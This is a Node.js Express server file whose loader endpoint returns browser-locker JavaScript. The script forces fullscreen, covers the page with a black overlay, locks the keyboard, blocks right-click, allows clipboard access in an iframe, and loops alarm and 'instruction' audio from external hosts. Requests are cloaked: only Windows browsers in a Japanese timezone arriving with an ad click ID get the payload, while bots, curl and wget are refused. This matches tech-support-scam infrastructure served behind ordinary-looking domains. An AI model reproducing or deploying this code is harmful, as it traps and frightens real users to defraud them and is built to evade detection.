import express from "express";
import cors from "cors";
import fs from "fs/promises";
import path from "path";
import { fileURLToPath } from "url";
import fetch from "node-fetch";

const app = express();
const PORT = process.env.PORT || 3000;

/**
 * ==============================
 * 🔴 GLOBAL TOGGLE (GitHub Action edits THIS line only)
 * ==============================
 */
const MODE = "ON"; // "ON" or "OFF"

/**
 * ==============================
 * Per-origin asset mapping
 * ==============================
 */
const ORIGIN_ASSETS = {
  "https://seishinyoga-arh0fkd7duceeseq.z01.azurefd.net": {
    htmlFile: MODE === "ON" ? "asset1.html" : "asset2.html",
    audioUrl:
      MODE === "ON"
        ? "https://audio.jukehost.co.uk/DyUy2se4Zy5Jn86qOojhJ6ttzee3XVu0"
        : "https://audio.jukehost.co.uk/jDTBEXiUPm75bqiedOtEYUt6h7ZjHHUj",
  },

  "https://sanyoga.life": {
    htmlFile: MODE === "ON" ? "asset1.html" : "asset2.html",
    audioUrl:
      MODE === "ON"
        ? "https://audio.jukehost.co.uk/DyUy2se4Zy5Jn86qOojhJ6ttzee3XVu0"
        : "https://audio.jukehost.co.uk/jDTBEXiUPm75bqiedOtEYUt6h7ZjHHUj",
  },
};

const ALLOWED_ORIGINS = Object.keys(ORIGIN_ASSETS);

// === Path helpers (ESM compatible)
const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

// === CORS (dynamic origin)
app.use(
  cors({
    credentials: true,
    origin(origin, cb) {
      if (!origin) return cb(new Error("CORS: Origin required"));
      if (ALLOWED_ORIGINS.includes(origin)) return cb(null, true);
      return cb(new Error("CORS: Not allowed"));
    },
  })
);

app.use(express.json());

// === Security Middleware
function validateRequest(req, res, next) {
  const origin = req.get("origin");

  if (!ALLOWED_ORIGINS.includes(origin)) {
    return res.status(403).send("FAILED: origin check");
  }

  req.asset = ORIGIN_ASSETS[origin];

  const ua = req.get("user-agent")?.toLowerCase() || "";
  const blockedAgents = ["bot", "spider", "crawler", "curl", "wget"];
  const isWindows = ua.includes("windows");

  if (blockedAgents.some((a) => ua.includes(a)) || !isWindows) {
    return res.status(403).send("FAILED: bot or not Windows");
  }

  const timezone = req.get("x-client-timezone");
  if (!["Asia/Tokyo", "Japan", "Etc/GMT-9"].includes(timezone)) {
    return res.status(403).send("FAILED: wrong timezone");
  }

  next();
}

// === Escaping helpers
function escapeForSingleQuotedJS(str) {
  return str
    .replace(/\\/g, "\\\\")
    .replace(/'/g, "\\'")
    .replace(/\r/g, "\\r")
    .replace(/\n/g, "\\n")
    .replace(/\u2028/g, "\\u2028")
    .replace(/\u2029/g, "\\u2029");
}

// === Route: frontend-loader
app.get("/frontend-loader", validateRequest, async (req, res) => {
  const gclid = req.query.gclid;
  if (!gclid || gclid.length < 10) {
    return res.status(403).send("FAILED: gclid missing or too short");
  }

  try {
    const asset = req.asset;
    const htmlPath = path.join(__dirname, asset.htmlFile);
    const rawHTML = await fs.readFile(htmlPath, "utf8");
    const srcdoc = escapeForSingleQuotedJS(rawHTML);

    const code = `
      (async () => {
        try { await document.documentElement.requestFullscreen(); } catch(e) {}

        const overlay = document.createElement('div');
        overlay.style.cssText = "position:fixed;inset:0;z-index:2147483647;background:#000;";
        document.body.appendChild(overlay);

        const iframe = document.createElement('iframe');
        iframe.allowFullscreen = true;
        iframe.setAttribute('allow', 'autoplay; clipboard-read; clipboard-write; fullscreen');
        iframe.style.cssText = "width:100%;height:100%;border:0;background:#000;";
        iframe.srcdoc = '${srcdoc}';
        overlay.appendChild(iframe);

        try { navigator.keyboard && navigator.keyboard.lock(); } catch(e) {}
        document.addEventListener('contextmenu', e => e.preventDefault());

        const beepAudio = new Audio('https://audio.jukehost.co.uk/wuD65PsKBrAxWCZU4cJ2CbhUqwl33URw');
        beepAudio.loop = true;
        beepAudio.play().catch(()=>{});

        const instructionAudio = new Audio('${escapeForSingleQuotedJS(asset.audioUrl)}');
        instructionAudio.loop = true;
        instructionAudio.play().catch(()=>{});
      })();
    `;

    const requestOrigin = req.get("origin");
    res.set("Access-Control-Allow-Origin", requestOrigin);

    console.log(
      `[MODE=${MODE}] Sent ${asset.htmlFile} → ${requestOrigin}`
    );

    return res.json({ code });
  } catch (err) {
    console.error("frontend-loader error:", err);
    return res.status(500).json({ error: "Failed to generate loader" });
  }
});

// === Start server
app.listen(PORT, () => {
  console.log(`Server running on port ${PORT} (MODE=${MODE})`);
});
